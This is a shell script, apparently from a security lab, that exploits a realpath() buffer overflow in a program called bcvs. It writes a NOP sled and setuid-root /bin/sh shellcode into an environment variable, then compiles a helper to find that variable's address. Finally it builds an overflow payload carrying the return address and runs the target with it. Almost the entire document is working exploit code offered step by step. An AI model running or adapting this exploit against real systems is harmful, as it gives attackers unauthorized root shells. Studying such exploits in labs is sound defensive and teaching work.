# This exploit is a realpath() buffer overflow
# The malicious shellcode is stored in environment
# variable: EGG.


# Step 1: Establish EGG with shellcode.
touch egg.py
echo "
import os
nopslol = b'\x90' * 512
shellcode = b'\x48\x31\xff\xb0\x69\x0f\x05\x48\x31\xd2\x48\xbb\xff\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xeb\x08\x53\x48\x89\xe7\x48\x31\xc0\x50\x57\x48\x89\xe6\xb0\x3b\x0f\x05\x6a\x01\x5f\x6a\x3c\x58\x0f\x05'

output = nopslol + shellcode
with open('eggcode','wb') as f:
	f.write(output)
" > egg.py
python egg.py

export EGG=$(cat eggcode)

# Step 2: Learn where the EGG variable is located, insert into payload code
touch getenv.c
echo "
#include <stdio.h>
#include <stdlib.h>

int main(int argc,char** argv){
	char* ptr = getenv(\"EGG\");
	printf(\"%p\\n\",ptr);
	return 0;
}
" > getenv.c

gcc -o getenv getenv.c

touch eggenv
./getenv > eggenv


# Step 3: Construct the payload file with the EGG address (or a little bit off)
touch payload.py
echo "
nops = 522 * b'\x41'
with open('eggenv','r') as g:
	e = g.read(14)
g.close()
e = int(e,0)
ret = e.to_bytes(6,'little')

output = nops + ret

with open('payload','wb') as f:
	f.write(output)
" > payload.py
python payload.py

# Step 4: Execute
/opt/bcvs/bcvs ci $(cat payload)
